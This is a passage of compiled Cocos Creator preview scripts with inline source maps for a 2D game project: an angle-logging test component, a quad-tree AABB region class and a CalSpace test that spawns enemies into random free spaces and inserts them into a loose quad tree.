//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvdGVzdC9UZXN0QW5nbGUudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQXVDLDZCQUFZO0lBQW5EOztJQWlCQSxDQUFDO0lBZkcsd0JBQXdCO0lBRXhCLGVBQWU7SUFFZix5QkFBSyxHQUFMO1FBQUEsaUJBUUM7UUFQRyxJQUFJLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxnQkFBZ0IsRUFBRTtZQUM3QyxJQUFJLE9BQU8sR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENBQUMsS0FBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQztZQUM1RCxJQUFJLEdBQUcsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUM7WUFDdEMsSUFBSSxLQUFLLEdBQUcsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLEdBQUcsQ0FBQyxDQUFDO1lBQ25DLE9BQU8sQ0FBQyxHQUFHLENBQUMsV0FBUyxLQUFLLGtCQUFhLEtBQUksQ0FBQyxJQUFJLENBQUMsUUFBUSxpQkFBWSxPQUFPLGVBQVUsR0FBRyxDQUFDLENBQUMsZUFBVSxHQUFHLENBQUMsQ0FBRyxDQUFDLENBQUM7UUFDbEgsQ0FBQyxDQUFDLENBQUM7UUFDSCxJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLENBQUMsRUFBRSxHQUFHLENBQUMsQ0FBQyxDQUFDO0lBQzdDLENBQUM7SUFkZ0IsU0FBUztRQUQ3QixPQUFPO09BQ2EsU0FBUyxDQWlCN0I7SUFBRCxnQkFBQztDQWpCRCxBQWlCQyxDQWpCc0MsRUFBRSxDQUFDLFNBQVMsR0FpQmxEO2tCQWpCb0IsU0FBUyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFRlc3RBbmdsZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgLy8gTElGRS1DWUNMRSBDQUxMQkFDS1M6XHJcblxyXG4gICAgLy8gb25Mb2FkICgpIHt9XHJcblxyXG4gICAgc3RhcnQgKCkge1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5ST1RBVElPTl9DSEFOR0VELCAoKT0+e1xyXG4gICAgICAgICAgICBsZXQgcmFkaWFucyA9IGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucygtdGhpcy5ub2RlLnJvdGF0aW9uKTtcclxuICAgICAgICAgICAgbGV0IGRpciA9IGNjLnYyKDAsIDEpLnJvdGF0ZShyYWRpYW5zKTtcclxuICAgICAgICAgICAgbGV0IGFuZ2xlID0gY2MudjIoMCwgMSkuYW5nbGUoZGlyKTtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coYGFuZ2xlPSR7YW5nbGV9IHJvdGF0aW9uPSR7dGhpcy5ub2RlLnJvdGF0aW9ufSByYWRpYW5zPSR7cmFkaWFuc30gZGlyLng9JHtkaXIueH0gZGlyLnk9JHtkaXIueX1gKTtcclxuICAgICAgICB9KTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnJvdGF0ZUJ5KDMsIDM2MCkpO1xyXG4gICAgfVxyXG5cclxuICAgIC8vIHVwZGF0ZSAoZHQpIHt9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/quad-tree/AABBRegion.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a6025pq4zRBAaeDsbWjyQrx', 'AABBRegion');
// script/quad-tree/AABBRegion.ts

Object.defineProperty(exports, "__esModule", { value: true });
var ccclass = cc._decorator.ccclass;
var AABBRegion = /** @class */ (function (_super) {
    __extends(AABBRegion, _super);
    function AABBRegion() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        /** 在第几层中 */
        _this.level = -1;
        /** 第几个cell中 */
        _this.index = -1;
        return _this;
    }
    AABBRegion.prototype.aabb = function () {
        return this.node.getBoundingBox();
    };
    AABBRegion = __decorate([
        ccclass
    ], AABBRegion);
    return AABBRegion;
}(cc.Component));
exports.default = AABBRegion;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvcXVhZC10cmVlL0FBQkJSZWdpb24udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUVPLElBQUEsT0FBTyxHQUFJLEVBQUUsQ0FBQyxVQUFVLFFBQWpCLENBQWtCO0FBR2hDO0lBQXdDLDhCQUFZO0lBQXBEO1FBQUEscUVBU0M7UUFSRyxZQUFZO1FBQ1osV0FBSyxHQUFHLENBQUMsQ0FBQyxDQUFDO1FBQ1gsZUFBZTtRQUNmLFdBQUssR0FBRyxDQUFDLENBQUMsQ0FBQzs7SUFLZixDQUFDO0lBSEcseUJBQUksR0FBSjtRQUNJLE9BQU8sSUFBSSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztJQUN0QyxDQUFDO0lBUmdCLFVBQVU7UUFEOUIsT0FBTztPQUNhLFVBQVUsQ0FTOUI7SUFBRCxpQkFBQztDQVRELEFBU0MsQ0FUdUMsRUFBRSxDQUFDLFNBQVMsR0FTbkQ7a0JBVG9CLFVBQVUiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuXHJcbmNvbnN0IHtjY2NsYXNzfSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBBQUJCUmVnaW9uIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuICAgIC8qKiDlnKjnrKzlh6DlsYLkuK0gKi9cclxuICAgIGxldmVsID0gLTE7XHJcbiAgICAvKiog56ys5Yeg5LiqY2VsbOS4rSAqL1xyXG4gICAgaW5kZXggPSAtMTtcclxuXHJcbiAgICBhYWJiKCk6IGNjLlJlY3R7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMubm9kZS5nZXRCb3VuZGluZ0JveCgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/test/CalSpace.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '311cdp+TxpBKIBw3eGfH3XZ', 'CalSpace');
// script/test/CalSpace.ts

Object.defineProperty(exports, "__esModule", { value: true });
var SpacePartition_1 = require("../../framework/extend/SpacePartition");
var Enemy_1 = require("../app/entities/enemy/Enemy");
var LooseQuadTree_1 = require("../quad-tree/LooseQuadTree");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var CalSpace = /** @class */ (function (_super) {
    __extends(CalSpace, _super);
    function CalSpace() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.entityNode = null;
        _this.entityNode2 = null;
        _this.enemyLayer = null;
        _this.graphics = null;
        _this.touchNode = null;
        // LIFE-CYCLE CALLBACKS:
        // onLoad () {}
        _this._rect = cc.rect(0, 0, 600, 800);
        return _this;
        // update (dt) {}
    }
    CalSpace.prototype.onTouchMove = function (event) {
        this.touchNode.position = this.touchNode.position.add(event.getDelta());
        this.getComponent(LooseQuadTree_1.default).test(cc.rect(this.touchNode.x - this.touchNode.width / 2, this.touchNode.y - this.touchNode.height / 2, this.touchNode.width, this.touchNode.height));
    };
    CalSpace.prototype.start = function () {
        var _this = this;
        this.touchNode.on(cc.Node.EventType.TOUCH_MOVE, this.onTouchMove, this);
        //获取矩形内的敌人
        this._rect.width = this.node.width;
        this._rect.height = this.node.height;
        this._rect.origin = cc.v2(-this._rect.width / 2, -this._rect.height / 2);
        this.graphics.rect(this._rect.x, this._rect.y, this._rect.width, this._rect.height);
        // let list:Array<cc.Rect> = [];
        // this.enemyLayer.children.forEach(value => {
        //     let space = value.getComponent(EnemyAttributes).space;
        //     let rect = cc.rect();
        //     rect.width = rect.height = space.getRadius()*2;
        //     rect.origin = space.getWorldPos().sub(cc.v2(rect.width/2, rect.height/2));
        //     let intersection = new cc.Rect();
        //     this._rect.intersection(intersection, rect);
        //     if (intersection.width > 0 && intersection.height > 0){
        //         list.push(rect);
        //     }
        // });
        // console.log(list, "list");
        // //画list
        // list.forEach(value => this.graphics.rect(value.xMin, value.yMin, value.width, value.height));
        // //开始划分含有子矩形的矩形
        // let arr = this.partitionRect(this._rect, list);
        // console.log(arr, "arr");
        // //画arr
        // arr.forEach(value => this.graphics.rect(value.xMin, value.yMin, value.width, value.height));
        var startTime = new Date().getTime();
        var count = 1;
        var partitions = [this._rect];
        var radius = this.entityNode.getComponent(Enemy_1.default).spaceCircleCollider.radius;
        var arr = SpacePartition_1.default.randomSpaces(partitions, radius * 2, radius * 2, count);
        console.log("生成数量:" + arr.length + " 生成时间:" + (new Date().getTime() - startTime));
        // console.log(partitions, "====>");
        console.log(arr, "===>");
        arr.forEach(function (value) {
            var enmeyNode = cc.instantiate(_this.entityNode);
            enmeyNode.position = value.center;
            _this.enemyLayer.addChild(enmeyNode);
            _this.getComponent(LooseQuadTree_1.default).insert(enmeyNode.getComponent(Enemy_1.default).enemyAABB);
        });
        // partitions = this.randomEntity(partitions);
        // partitions.forEach(value => this.graphics.rect(value.xMin, value.yMin, value.width, value.height));
        this.schedule(function () {
            if (count < 10) {
                var startTime_1 = new Date().getTime();
                var rect = SpacePartition_1.default.randomSpace(partitions, radius * 2, radius * 2);
                if (rect) {
                    var enmeyNode = cc.instantiate(_this.entityNode2);
                    enmeyNode.position = rect.center;
                    _this.enemyLayer.addChild(enmeyNode);
                    _this.getComponent(LooseQuadTree_1.default).insert(enmeyNode.getComponent(Enemy_1.default).enemyAABB);
                    count++;
                    console.log("生成数量:" + count + " 生成时间:" + (new Date().getTime() - startTime_1));
                }
            }
        }, 0.11);
        this.graphics.stroke();
    };
    __decorate([
        property(cc.Node)
    ], CalSpace.prototype, "entityNode", void 0);
    __decorate([
        property(cc.Node)
    ], CalSpace.prototype, "entityNode2", void 0);
    __decorate([
        property(cc.Node)
    ], CalSpace.prototype, "enemyLayer", void 0);
    __decorate([
        property(cc.Graphics)
    ], CalSpace.prototype, "graphics", void 0);
    __decorate([
        property(cc.Node)
    ], CalSpace.prototype, "touchNode", void 0);
    CalSpace = __decorate([
        ccclass
    ], CalSpace);
    return CalSpace;
}(cc.Component));
exports.default = CalSpace;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvdGVzdC9DYWxTcGFjZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0Esd0VBQW1FO0FBQ25FLHFEQUFnRDtBQUNoRCw0REFBdUQ7QUFFakQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBc0MsNEJBQVk7SUFBbEQ7UUFBQSxxRUE2RkM7UUExRkcsZ0JBQVUsR0FBVyxJQUFJLENBQUM7UUFHMUIsaUJBQVcsR0FBVyxJQUFJLENBQUM7UUFHM0IsZ0JBQVUsR0FBVyxJQUFJLENBQUM7UUFHMUIsY0FBUSxHQUFlLElBQUksQ0FBQztRQUc1QixlQUFTLEdBQVcsSUFBSSxDQUFDO1FBRXpCLHdCQUF3QjtRQUV4QixlQUFlO1FBRWYsV0FBSyxHQUFXLEVBQUUsQ0FBQyxJQUFJLENBQUMsQ0FBQyxFQUFFLENBQUMsRUFBRSxHQUFHLEVBQUUsR0FBRyxDQUFDLENBQUM7O1FBdUV4QyxpQkFBaUI7SUFDckIsQ0FBQztJQXRFRyw4QkFBVyxHQUFYLFVBQVksS0FBSztRQUNiLElBQUksQ0FBQyxTQUFTLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxTQUFTLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxLQUFLLENBQUMsUUFBUSxFQUFFLENBQUMsQ0FBQztRQUN4RSxJQUFJLENBQUMsWUFBWSxDQUFDLHVCQUFhLENBQUMsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLENBQUMsR0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEtBQUssR0FBQyxDQUFDLEVBQUUsSUFBSSxDQUFDLFNBQVMsQ0FBQyxDQUFDLEdBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxTQUFTLENBQUMsS0FBSyxFQUFFLElBQUksQ0FBQyxTQUFTLENBQUMsTUFB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Q087SUFmUixRQUFRO1FBRDVCLE9BQU87T0FDYSxRQUFRLENBNkY1QjtJQUFELGVBQUM7Q0E3RkQsQUE2RkMsQ0E3RnFDLEVBQUUsQ0FBQyxTQUFTLEdBNkZqRDtrQkE3Rm9CLFFBQVEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IFNwYWNlUGFydGl0aW9uIGZyb20gXCIuLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL1NwYWNlUGFydGl0aW9uXCI7XHJcbmltcG9ydCBFbmVteSBmcm9tIFwiLi4vYXBwL2VudGl0aWVzL2VuZW15L0VuZW15XCI7XHJcbmltcG9ydCBMb29zZVF1YWRUcmVlIGZyb20gXCIuLi9xdWFkLXRyZWUvTG9vc2VRdWFkVHJlZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBDYWxTcGFjZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBlbnRpdHlOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgZW50aXR5Tm9kZTI6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBlbmVteUxheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5HcmFwaGljcylcclxuICAgIGdyYXBoaWNzOmNjLkdyYXBoaWNzID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHRvdWNoTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICAvLyBMSUZFLUNZQ0xFIENBTExCQUNLUzpcclxuXHJcbiAgICAvLyBvbkxvYWQgKCkge31cclxuXHJcbiAgICBfcmVjdDpjYy5SZWN0ID0gY2MucmVjdCgwLCAwLCA2MDAsIDgwMCk7XHJcblxyXG4gICAgb25Ub3VjaE1vdmUoZXZlbnQpe1xyXG4gICAgICAgIHRoaXMudG91Y2hOb2RlLnBvc2l0aW9uID0gdGhpcy50b3VjaE5vZGUucG9zaXRpb24uYWRkKGV2ZW50LmdldERlbHRhKCkpO1xyXG4gICAgICAgIHRoaXMuZ2V0Q29tcG9uZW50KExvb3NlUXVhZFRyZWUpLnRlc3QoY2MucmVjdCh0aGlzLnRvdWNoTm9kZS54LXRoaXMudG91Y2hOb2RlLndpZHRoLzIsIHRoaXMudG91Y2hOb2RlLnktdGhpcy50b3VjaE5vZGUuaGVpZ2h0LzIsIHRoaXMudG91Y2hOb2RlLndpZHRoLCB0aGlzLnRvdWNoTm9kZS5oZWlnaHQpKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGFydCAoKSB7XHJcbiAgICAgICAgdGhpcy50b3VjaE5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfTU9WRSwgdGhpcy5vblRvdWNoTW92ZSwgdGhpcyk7XHJcbiAgICAgICAgLy/ojrflj5bnn6nlvaLlhoXnmoTmlYzkurpcclxuICAgICAgICB0aGlzLl9yZWN0LndpZHRoID0gdGhpcy5ub2RlLndpZHRoO1xyXG4gICAgICAgIHRoaXMuX3JlY3QuaGVpZ2h0ID0gdGhpcy5ub2RlLmhlaWdodDtcclxuICAgICAgICB0aGlzLl9yZWN0Lm9yaWdpbiA9IGNjLnYyKC10aGlzLl9yZWN0LndpZHRoLzIsIC10aGlzLl9yZWN0LmhlaWdodC8yKTtcclxuICAgICAgICB0aGlzLmdyYXBoaWNzLnJlY3QodGhpcy5fcmVjdC54LCB0aGlzLl9yZWN0LnksIHRoaXMuX3JlY3Qud2lkdGgsIHRoaXMuX3JlY3QuaGVpZ2h0KTtcclxuXHJcbiAgICAgICAgLy8gbGV0IGxpc3Q6QXJyYXk8Y2MuUmVjdD4gPSBbXTtcclxuICAgICAgICAvLyB0aGlzLmVuZW15TGF5ZXIuY2hpbGRyZW4uZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgLy8gICAgIGxldCBzcGFjZSA9IHZhbHVlLmdldENvbXBvbmVudChFbmVteUF0dHJpYnV0ZXMpLnNwYWNlO1xyXG4gICAgICAgIC8vICAgICBsZXQgcmVjdCA9IGNjLnJlY3QoKTtcclxuICAgICAgICAvLyAgICAgcmVjdC53aWR0aCA9IHJlY3QuaGVpZ2h0ID0gc3BhY2UuZ2V0UmFkaXVzKCkqMjtcclxuICAgICAgICAvLyAgICAgcmVjdC5vcmlnaW4gPSBzcGFjZS5nZXRXb3JsZFBvcygpLnN1YihjYy52MihyZWN0LndpZHRoLzIsIHJlY3QuaGVpZ2h0LzIpKTtcclxuICAgICAgICAvLyAgICAgbGV0IGludGVyc2VjdGlvbiA9IG5ldyBjYy5SZWN0KCk7XHJcbiAgICAgICAgLy8gICAgIHRoaXMuX3JlY3QuaW50ZXJzZWN0aW9uKGludGVyc2VjdGlvbiwgcmVjdCk7XHJcbiAgICAgICAgLy8gICAgIGlmIChpbnRlcnNlY3Rpb24ud2lkdGggPiAwICYmIGludGVyc2VjdGlvbi5oZWlnaHQgPiAwKXtcclxuICAgICAgICAvLyAgICAgICAgIGxpc3QucHVzaChyZWN0KTtcclxuICAgICAgICAvLyAgICAgfVxyXG4gICAgICAgIC8vIH0pO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKGxpc3QsIFwibGlzdFwiKTtcclxuICAgICAgICAvLyAvL+eUu2xpc3RcclxuICAgICAgICAvLyBsaXN0LmZvckVhY2godmFsdWUgPT4gdGhpcy5ncmFwaGljcy5yZWN0KHZhbHVlLnhNaW4sIHZhbHVlLnlNaW4sIHZhbHVlLndpZHRoLCB2YWx1ZS5oZWlnaHQpKTtcclxuICAgICAgICAvLyAvL+W8gOWni+WIkuWIhuWQq+acieWtkOefqeW9oueahOefqeW9olxyXG4gICAgICAgIC8vIGxldCBhcnIgPSB0aGlzLnBhcnRpdGlvblJlY3QodGhpcy5fcmVjdCwgbGlzdCk7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coYXJyLCBcImFyclwiKTtcclxuICAgICAgICAvLyAvL+eUu2FyclxyXG4gICAgICAgIC8vIGFyci5mb3JFYWNoKHZhbHVlID0+IHRoaXMuZ3JhcGhpY3MucmVjdCh2YWx1ZS54TWluLCB2YWx1ZS55TWluLCB2YWx1ZS53aWR0aCwgdmFsdWUuaGVpZ2h0KSk7XHJcbiAgICAgICAgbGV0IHN0YXJ0VGltZSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpO1xyXG4gICAgICAgIGxldCBjb3VudCA9IDE7XHJcbiAgICAgICAgbGV0IHBhcnRpdGlvbnMgPSBbdGhpcy5fcmVjdF07XHJcbiAgICAgICAgbGV0IHJhZGl1cyA9IHRoaXMuZW50aXR5Tm9kZS5nZXRDb21wb25lbnQoRW5lbXkpLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzO1xyXG4gICAgICAgIGxldCBhcnIgPSBTcGFjZVBhcnRpdGlvbi5yYW5kb21TcGFjZXMocGFydGl0aW9ucywgcmFkaXVzKjIsIHJhZGl1cyoyLCBjb3VudCk7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLnlJ/miJDmlbDph486XCIrYXJyLmxlbmd0aCtcIiDnlJ/miJDml7bpl7Q6XCIrKG5ldyBEYXRlKC